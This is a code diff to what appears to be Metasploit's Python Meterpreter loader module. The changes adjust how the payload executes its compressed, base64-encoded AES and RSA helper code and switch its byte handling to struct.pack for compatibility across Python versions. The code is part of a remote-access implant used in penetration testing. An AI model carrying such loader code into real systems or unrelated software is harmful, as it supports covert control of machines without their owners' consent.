@@ -151,8 +151,8 @@ module Payload::Python::MeterpreterLoader
 import codecs,imp,base64,zlib
 met_aes = imp.new_module('met_aes')
 met_rsa = imp.new_module('met_rsa')
-exec(compile(zlib.decompress(base64.b64decode(codecs.getencoder('utf-8')('#{aes_encryptor}')[0])),'<string>','exec'), met_aes.__dict__)
-exec(compile(zlib.decompress(base64.b64decode(codecs.getencoder('utf-8')('#{rsa_encryptor}')[0])),'<string>','exec'), met_rsa.__dict__)
+exec(compile(zlib.decompress(base64.b64decode(codecs.getencoder('utf-8')('#{aes_encryptor}')[0])),'met_aes','exec'), met_aes.__dict__)
+exec(compile(zlib.decompress(base64.b64decode(codecs.getencoder('utf-8')('#{rsa_encryptor}')[0])),'met_rsa','exec'), met_rsa.__dict__)
 sys.modules['met_aes'] = met_aes
 sys.modules['met_rsa'] = met_rsa
 import met_rsa, met_aes
@@ -169,59 +169,60 @@ def met_aes_decrypt(key, iv, pt):
     %Q?
 import sys,math,random,binascii as ba,os
 from struct import unpack as u
+from struct import pack
 is2 = sys.version_info[0]<3
 def bt(b):
 	if is2:
 		return b
 	return ord(b)
 def b2i(b):
-	if is2:
-		return int(b.encode('hex'),16)
-	return int.from_bytes(b,byteorder='big')
+	return int(ba.b2a_hex(b),16)
 def i2b(i):
-	h='{0:x}'.format(i)
+	h='%x'%i
 	if len(h)%2==1:
 		h ='0'+h
-	return ba.unhexlify(h)
+	if not is2:
+		h=h.encode('utf-8')
+	return ba.a2b_hex(h)
 def rs(a,o):
-	if a[o]==bt(b'\\x81'):
+	if a[o]==bt(pack('B',0x81)):
 		return(u('B',a[o+1])[0],2+o)
-	elif a[o] == bt(b'\\x82'):
+	elif a[o] == bt(pack('B',0x82)):
 		return(u('>H',a[o+1:o+3])[0],3+o)
 def ri(b,o):
 	i,o =rs(b,o)
 	return(b[o:o+i],o+i)
 def b2me(b):
-	if b[0]!=bt(b'\\x30'):
+	if b[0]!=bt(pack('B',0x30)):
 		return(None,None)
 	_,o=rs(b,1)
-	if b[o]!=bt(b'\\x02'):
+	if b[o]!=bt(pack('B',2)):
 		return(None,None)
 	(m,o)=ri(b,o+1)
-	if b[o]!=bt(b'\\x02'):
+	if b[o]!=bt(pack('B',2)):
 		return(None,None)
 	e=b[o+2:]
 	return(b2i(m),b2i(e))
 def der2me(d):
-	if d[0]!=bt(b'\\x30'):
+	if d[0]!=bt(pack('B',0x30)):
 		return(None,None)
 	_,o=rs(d,1)
 	while o<len(d):
-		if d[o]==bt(b'\\x30'):
+		if d[o]==bt(pack('B',0x30)):
 			o+=u('B',d[o+1:o+2])[0]
-		elif d[o]==bt(b'\\x05'):
+		elif d[o]==bt(pack('B',0x05)):
 			o+=2
-		elif d[o]==bt(b'\\x03'):
+		elif d[o]==bt(pack('B',0x03)):
 			_,o=rs(d,o+1)
 			return b2me(d[o+1:])
 		else:
 			return(None,None)
 def rsa_enc(der,msg):
 	m,e=der2me(der)
-	h=b'\\x00\\x02'
-	d=b'\\00'
+	h=pack('BB',0,2)
+	d=pack('B',0)
 	l=256-len(h)-len(msg)-len(d)
-	p=os.urandom(512).replace(b'\\x00',b'')
+	p=os.urandom(512).replace(pack('B',0),pack(''))
 	return i2b(pow(b2i(h+p[:l]+d+msg),e,m))
 ?
   end
@@ -252,6 +253,7 @@ if sys.version_info[0]>=3:
 		return a+bytes(b)
 else:
 	bytes=lambda s,e:s
+empty=struct.pack('')
 class AESCBC(object):
 	nrs={16:10,24:12,32:14}
 	rcon=[1,2,4,8,16,32,64,128,27,54,108,216,171,77,154,47,94,188,99,198,151,53,106,212,179,125,250,239,197,145]
@@ -330,7 +332,7 @@ class AESCBC(object):
 		else:
 			self._lcb=_s2b(iv)
 		pt=self.pad(pt)
-		return b''.join([self.enc_b(b)for b in chunks(pt,16)])
+		return empty.join([self.enc_b(b)for b in chunks(pt,16)])
 	def enc_b(self,pt):
 		if len(pt)!=16:
 			raise ValueError('plaintext block must be 16 bytes')
@@ -343,7 +345,7 @@ class AESCBC(object):
 			self._lcb=_s2b(iv)
 		if len(ct)%16!=0:
 			raise ValueError('ciphertext must be a multiple of 16')
-		return self.unpad(b''.join([self.dec_b(b)for b in chunks(ct,16)]))
+		return self.unpad(empty.join([self.dec_b(b)for b in chunks(ct,16)]))
 	def dec_b(self,ct):
 		if len(ct)!=16:
 			raise ValueError('ciphertext block must be 16 bytes')
